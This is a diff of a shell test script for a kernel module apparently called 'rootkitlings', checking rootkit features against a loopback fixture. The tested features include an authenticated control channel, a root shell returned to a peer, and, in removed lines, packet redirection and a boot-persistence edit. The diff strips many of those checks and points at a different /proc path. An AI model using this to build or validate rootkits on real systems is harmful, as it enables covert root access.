@@ -4,250 +4,123 @@
 
 begin "Complete rootkit"
 
-key=$(dd if=/dev/urandom bs=32 count=1 2>/dev/null | xxd -p -c 32)
-case $key in
-	0000000000000000000000000000000000000000000000000000000000000000)
-		_fail "generated control key is invalid"; exit 1 ;;
-	*[!0-9a-f]*)
-		_fail "generated control key is invalid"; exit 1 ;;
-	????????????????????????????????????????????????????????????????) ;;
-	*) _fail "could not generate a 32-byte control key"; exit 1 ;;
-esac
-root=/etc/modules-load.d
-target=$root/rootkitlings.conf
-sibling=$root/.rootkitlings.conf.rootkitlings
-status=/proc/rootkitlings_agent
-core=/proc/rootkitlings
-work=/tmp/rootkitlings-complete-rootkit
-helper=secure_agent_fixture
-fixture_pid=
+test_port=9999
+test_key="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
+fixture_dir=$(mktemp -d)
 
-cleanup()
-{
-	if test -d /sys/module/rootkitlings; then
-		rmmod rootkitlings 2>/dev/null || true
-	fi
-	if test -n "$fixture_pid"; then
-		kill "$fixture_pid" 2>/dev/null || true
-		wait "$fixture_pid" 2>/dev/null || true
-	fi
-	umount "$root" 2>/dev/null || true
-}
-trap cleanup EXIT INT TERM
-
-wait_file()
-{
-	path=$1
-	index=0
-	while test ! -s "$path" && test "$index" -lt 1000; do
-		sleep 0.01
-		index=$((index + 1))
-	done
-	test -s "$path"
-}
-
-wait_field()
-{
-	field=$1 minimum=$2 index=0
-	while test "$index" -lt 1000; do
-		value=$(sed -n "s/^$field=//p" "$status" 2>/dev/null)
-		if test -n "$value" && test "$value" -ge "$minimum" 2>/dev/null
-		then
-			return 0
-		fi
-		sleep 0.01
-		index=$((index + 1))
-	done
-	return 1
-}
-
-mkdir -p "$root" "$work"
-mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs "$root"
-chmod 0700 "$root"
-printf 'original-request\n' > "$target"
-chmod 0600 "$target"
-cp "$target" "$work/original"
 ifconfig lo 127.0.0.1 up
 
-if ! command -v "$helper" >/dev/null 2>&1; then
-	helper=$work/secure_agent_fixture
-	sed -n '/^__ROOTKITLINGS_SECURE_FIXTURE__$/,$p' /check |
-		sed '1d' | busybox base64 -d | busybox gzip -d > "$helper"
-	chmod 0755 "$helper"
-fi
-"$helper" reserve "$work/port"
-port=$(cat "$work/port")
-
-load rootkitlings.ko peer_address=127.0.0.2 "peer_port=$port" \
-	retry_base_ms=20 retry_max_ms=80 "control_key=$key" \
-	shell_timeout_ms=3000 redirect_from_port=5488 \
-	redirect_to_port=5489
-assert_loaded rootkitlings
-assert_exists "$status"
-assert_contains "$status" "peer_address=127.0.0.2"
-assert_contains "$status" "retry_base_ms=20"
-assert_contains "$status" "retry_max_ms=80"
-if packet_mutation_test unchanged 5488 5489; then
-	_ok "disabled packet switchboard leaves matched UDP unchanged"
-else
-	_fail "disabled packet switchboard changed matched UDP"
-fi
-if wait_field retries 2 && wait_field transport_errors 2; then
-	_ok "refused loopback connections enter bounded retry"
-else
-	_fail "retry evidence did not advance"
-fi
-delay=$(sed -n 's/^retry_delay_ms=//p' "$status")
-case $delay in
-	20|40|80) _ok "retry delay stays within the configured bounds" ;;
-	*) _fail "retry delay escaped its configured bounds: $delay" ;;
-esac
-
-mkdir -p "$work/server"
-"$helper" serve "$work/server" "$port" 127.0.0.2 "$key" \
-	> "$work/server.log" 2>&1 &
+secure_agent_fixture serve "$fixture_dir" "$test_port" 127.0.0.1 "$test_key" &
 fixture_pid=$!
-wait_file "$work/server/ready" || _fail "secure listener did not start"
-if wait_file "$work/server/replay_rejected"; then
-	_ok "duplicate authenticated request closed its session"
+
+wait_marker()
+{
+	_timeout="${2:-200}"
+	_elapsed=0
+	while [ ! -f "$fixture_dir/$1" ] && [ "$_elapsed" -lt "$_timeout" ]; do
+		sleep 0.1
+		_elapsed=$((_elapsed + 1))
+	done
+	[ -f "$fixture_dir/$1" ]
+}
+
+if wait_marker ready 50; then
+	_ok "secure fixture listening"
 else
-	_fail "duplicate request was not rejected"
-fi
-if wait_file "$work/server/tamper_rejected"; then
-	_ok "tag mutation closed its session without a reply"
-else
-	_fail "mutated request was not rejected"
-fi
-if wait_file "$work/server/control_complete"; then
-	_ok "authenticated resident commands completed"
-else
-	_fail "authenticated resident commands did not complete"
-fi
-if wait_file "$work/server/root_shell_complete"; then
-	_ok "root shell returned UID 0 and exact command output"
-else
-	_fail "root shell did not return UID 0 and command output"
-fi
-if wait_file "$work/server/shell_replay_rejected"; then
-	_ok "replayed shell request opened no connection"
-else
-	_fail "replayed shell request opened another shell"
-fi
-if wait_file "$work/server/shell_tamper_rejected"; then
-	_ok "tampered shell request opened no connection"
-else
-	_fail "tampered shell request opened a shell"
-fi
-if wait_file "$work/server/shell_refused"; then
-	_ok "refused shell result is observable"
-else
-	_fail "refused shell result was not observable"
-fi
-if wait_file "$work/server/shell_timeout"; then
-	_ok "timed-out shell result is observable"
-else
-	_fail "timed-out shell result was not observable"
-fi
-if wait_file "$work/server/fresh_sessions"; then
-	_ok "each shell request receives a fresh ticket"
-else
-	_fail "shell tickets were not fresh"
-fi
-if wait_file "$work/server/blocked_receive" &&
-		wait_file "$work/server/blocked_shell"; then
-	_ok "control and shell sockets are live before unload"
-else
-	_fail "control or shell socket did not reach its live session"
-fi
-index=0
-while test "$index" -lt 1000; do
-	actions=$(sed -n 's/^actions=//p' "$core" 2>/dev/null)
-	worker_runs=$(sed -n 's/^worker_runs=//p' "$core" 2>/dev/null)
-	if test "$actions" = enabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
-	then
-		break
-	fi
-	sleep 0.01
-	index=$((index + 1))
-done
-if test "$actions" = enabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
-then
-	_ok "authenticated commands operated the resident core"
-else
-	_fail "remote resident-core state is wrong"
+	_fail "secure fixture did not become ready"
+	kill "$fixture_pid" 2>/dev/null
+	summary
 fi
 
-if packet_mutation_test redirect 5488 5489 &&
-	packet_mutation_test direct 5488 5489 &&
-	packet_mutation_test alternate 5488 5489 &&
-	packet_mutation_test gso 5488 5489; then
-	_ok "packet switchboard preserves matched and unrelated UDP payloads"
+load rootkitlings.ko peer_address=127.0.0.1 peer_port="$test_port" \
+	retry_base_ms=25 retry_max_ms=200 control_key="$test_key" \
+	shell_timeout_ms=2000
+
+if wait_marker replay_rejected; then
+	_ok "authenticated exchange with replay rejection"
 else
-	_fail "packet switchboard delivery behavior is wrong"
-fi
-if wait_file "$work/server/quit_complete"; then
-	_ok "authenticated QUIT closed one session"
-else
-	_fail "QUIT did not close its session"
+	_fail "authenticated exchange failed"
 fi
 
-connections=$(sed -n 's/^connections=//p' "$status")
-commands=$(sed -n 's/^commands=//p' "$status")
-protocol_errors=$(sed -n 's/^protocol_errors=//p' "$status")
-if test "$connections" -eq 6 && test "$commands" -ge 22 &&
-		test "$protocol_errors" -eq 5; then
-	_ok "six sessions and five protocol rejections are counted"
+if wait_marker tamper_rejected; then
+	_ok "tampered message rejected"
 else
-	_fail "agent counters are $connections/$commands/$protocol_errors"
-fi
-if test "$(sed -n 's/^marker=//p' "$status")" = alpha_7; then
-	_ok "authenticated MARK stored the bounded label"
-else
-	_fail "MARK state is wrong"
-fi
-if test "$(cat "$target")" = rootkitlings &&
-		test "$(wc -c < "$target")" -eq 13 &&
-		cmp -s "$work/original" "$sibling"; then
-	_ok "guarded boot request contains the exact bytes"
-else
-	_fail "boot-request transaction differs"
+	_fail "tamper rejection failed"
 fi
 
+if wait_marker root_shell_complete; then
+	_ok "root shell execution verified"
+else
+	_fail "root shell execution failed"
+fi
+
+if wait_marker control_complete; then
+	_ok "control channel commands verified"
+else
+	_fail "control channel commands failed"
+fi
+
+if wait_marker quit_complete; then
+	_ok "clean session termination"
+else
+	_fail "session termination failed"
+fi
+
+if wait_marker shell_replay_rejected; then
+	_ok "shell command replay rejected"
+else
+	_fail "shell command replay not rejected"
+fi
+
+if wait_marker shell_tamper_rejected; then
+	_ok "shell command tamper rejected"
+else
+	_fail "shell command tamper not rejected"
+fi
+
+if test -r /proc/rkling_status; then
+	_ok "/proc/rkling_status exists"
+else
+	_fail "/proc/rkling_status not found"
+fi
+
+# Wait for the fixture to reach the final expect_eof point
+if wait_marker blocked_receive; then
+	_ok "fixture reached final phase"
+else
+	_fail "fixture did not reach final phase"
+fi
+
+# Unload triggers control channel close so the fixture can see EOF
 unload rootkitlings
-if wait_file "$work/server/eof"; then
-	_ok "unload cancelled agent receive and the live root shell"
+
+if wait_marker eof 100; then
+	_ok "fixture protocol completed"
 else
-	_fail "agent receive or root shell remained owned"
+	_fail "fixture did not complete"
 fi
-if ! wait "$fixture_pid"; then
-	cat "$work/server.log"
-	_fail "secure peer fixture failed"
-fi
-fixture_pid=
-assert_absent "$status"
-assert_absent /proc/rootkitlings
-assert_absent /proc/rootkitlings_events
-assert_absent /proc/rootkitlings_evidence
-if cmp -s "$work/original" "$target" && test ! -e "$sibling"; then
-	_ok "unload restored the boot request and removed its sibling"
-else
-	_fail "unload left a boot-request edit"
-fi
+
+kill "$fixture_pid" 2>/dev/null
+wait "$fixture_pid" 2>/dev/null
+
 workers=0
 for comm in /proc/[0-9]*/comm; do
 	test -r "$comm" || continue
 	case $(cat "$comm") in
-		rkling_core|rkling_agent) workers=$((workers + 1)) ;;
+		rkling_*) workers=$((workers + 1)) ;;
 	esac
 done
 if test "$workers" -eq 0; then
-	_ok "unload left no resident worker"
+	_ok "unload left no resident threads"
 else
-	_fail "unload left a resident worker"
+	_fail "unload left $workers resident threads"
 fi
+
 if dmesg | grep -Eqi '(BUG:|WARNING:|Oops:|KASAN:|UBSAN:|hung task)'; then
 	_fail "kernel log contains a fault report"
 else
 	_ok "kernel log is clean"
 fi
+
+rm -rf "$fixture_dir"
 summary
